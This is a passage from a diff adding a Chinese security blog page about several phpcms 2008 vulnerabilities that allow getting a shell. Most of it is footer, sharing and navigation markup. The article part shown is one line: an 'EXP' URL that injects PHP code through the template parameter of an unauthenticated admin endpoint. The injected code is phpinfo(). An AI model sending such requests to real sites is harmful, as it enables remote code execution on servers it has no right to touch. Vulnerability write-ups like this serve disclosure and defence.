class="line">&#125;</div></pre></td></tr></table></figure><p></p>
+<h3 id="是用来处理一些模板语法，完全不用理会。"><a href="#是用来处理一些模板语法，完全不用理会。" class="headerlink" title="是用来处理一些模板语法，完全不用理会。"></a>是用来处理一些模板语法，完全不用理会。</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXP:http://localhost/yp/business/?file=../../admin/block&amp;action=post&amp;blockid=eval&amp;template=&lt;?php phpinfo();exit();?&gt;</div></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Index</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#文件包含"><span class="toc-number">1.</span> <span class="toc-text">文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用注册一个企业用户"><span class="toc-number">2.</span> <span class="toc-text">利用注册一个企业用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#再看这一句"><span class="toc-number">3.</span> <span class="toc-text">再看这一句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#首先进入视线的是-admin-upload-inc-php-看名字就知道如果能利用的话，将会…-省略500字"><span class="toc-number">4.</span> <span class="toc-text">首先进入视线的是/admin/upload.inc.php 看名字就知道如果能利用的话，将会…..(省略500字)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#没什么好说的看EXP-上传后查看网页源代码即可找到上传路径"><span class="toc-number">5.</span> <span class="toc-text">没什么好说的看EXP, 上传后查看网页源代码即可找到上传路径.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#猫了个咪，打开文件我就想骂人了，做为admin目录下的文件，没有任何权限判断。看144行左右，当-action-等于-post时。"><span class="toc-number">6.</span> <span class="toc-text">猫了个咪，打开文件我就想骂人了，做为admin目录下的文件，没有任何权限判断。看144行左右，当$action 等于 post时。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#是用来处理一些模板语法，完全不用理会。"><span class="toc-number">7.</span> <span class="toc-text">是用来处理一些模板语法，完全不用理会。</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://secoff.net/archives/13.html"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://secoff.net/archives/13.html&text=phpcms 2008多个漏洞 (可getshell)"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://secoff.net/archives/13.html&title=phpcms 2008多个漏洞 (可getshell)"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://secoff.net/archives/13.html&is_video=false&description=phpcms 2008多个漏洞 (可getshell)"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=phpcms 2008多个漏洞 (可getshell)&body=Check out this article: http://secoff.net/archives/13.html"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://secoff.net/archives/13.html&title=phpcms 2008多个漏洞 (可getshell)"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://secoff.net/archives/13.html&title=phpcms 2008多个漏洞 (可getshell)"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://secoff.net/archives/13.html&title=phpcms 2008多个漏洞 (可getshell)"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://secoff.net/archives/13.html&title=phpcms 2008多个漏洞 (可getshell)"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://secoff.net/archives/13.html&name=phpcms 2008多个漏洞 (可getshell)&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    
+<div class="content index width mx-auto px2 my4" style="max-width:58rem">
+<footer id="footer" style="max-width:58rem">
+
+  <div class="footer-left">
+    Copyright &copy; 2017 b4dboy
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Index</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- Google Analytics -->
+
+<!-- Disqus Comments -->
+
+
